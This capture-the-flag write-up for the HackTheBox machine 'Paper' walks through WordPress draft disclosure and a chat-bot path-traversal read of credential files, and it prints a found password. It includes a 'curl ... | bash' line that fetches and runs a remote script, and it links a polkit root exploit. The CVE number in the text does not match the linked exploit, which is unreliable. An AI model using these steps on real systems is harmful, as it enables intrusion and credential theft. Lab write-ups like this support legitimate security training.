## Paper

Difficulty: Easy

### User Flag

```
rustscan -a paper.htb --ulimit 5000 -- -A -sV -sC
```

![rustscan](https://user-images.githubusercontent.com/58514930/219438575-1b4bc0e3-b4c5-4acd-99f8-36f22c367850.png)

<br>

There is nothing interesting in the web page. Looking through the requests, we find a domain to access: office.paper

![x-backend-server](https://user-images.githubusercontent.com/58514930/219438608-597810db-2d99-4635-ab41-3c4f8cd45d08.png)

![office paper](https://user-images.githubusercontent.com/58514930/219439038-08514625-444a-4348-95dc-4a49fd8584aa.png)

<br>

The website seems to be constructed in WordPress, so we run WPScan to look for vulnerabilities.

```
wpscan --url http://office.paper -e vp --api-token <TOKEN>
```

The result show to us that there is a vulnerability that permit any user to see private and draft posts.

![wpscan result](https://user-images.githubusercontent.com/58514930/219439291-4f713798-22df-44d5-8d7e-644c7a85f84d.png)

<br>

There is one post in the site that give us a hint that we may find something in the drafts.

![draft-hint](https://user-images.githubusercontent.com/58514930/219439471-28afbe37-0cee-4dd9-a3d3-001fe8b12d30.png)

<br>

To exploit the vulnerability, we access http://office.paper/?static=1.  

Here we discover a secret URL to register to a chat system.  

> Remember to add office.paper and chat.office.paper to /etc/hosts.

![registerURL](https://user-images.githubusercontent.com/58514930/219440263-0ab0d039-72e1-4db1-85a6-f1755626af6b.png)

![registering](https://user-images.githubusercontent.com/58514930/219440853-108f460a-32d5-4204-a8fe-07e2f368c1fb.png)

<br>

Inside this chat system, there is a bot called recyclops that retrieve us some files. This bot is vulnerable to LFI.  

Searching inside the files we find credentials in ../hubot/.env.  

You could also enumerate the ../../../../../proc/self/environ file to get this information.  

![recyclopsLFI](https://user-images.githubusercontent.com/58514930/219441141-800b7c84-d461-4741-9566-e0b042f58f78.png)

<br>

This credentials doesn't work in SSH, so we go to the chat and enumerate some users.

![userEnumeration](https://user-images.githubusercontent.com/58514930/219441686-9ac558be-0d4e-4fe9-9950-7c6dff4e98f6.png)

<br>

The password "Queenofblad3s!23" works in SSH with the user dwight.

### Root Flag

Doing some enumeration with linPeas, we see that the machines is vulnerable to CVE-2021-4034.

> To directly execute linPeas you can use: curl http://10.10.14.5:8000/linpeas.sh | bash

![linPeas](https://user-images.githubusercontent.com/58514930/219442256-bccb3121-b7aa-47de-9176-1b5d32b6e78e.png)

<br>

Just execute [this exploit](https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py) and get the root.

![exploitRoot](https://user-images.githubusercontent.com/58514930/219442238-c0cbe72e-b005-48f2-8ac9-a2bfa3b6e7ff.png)
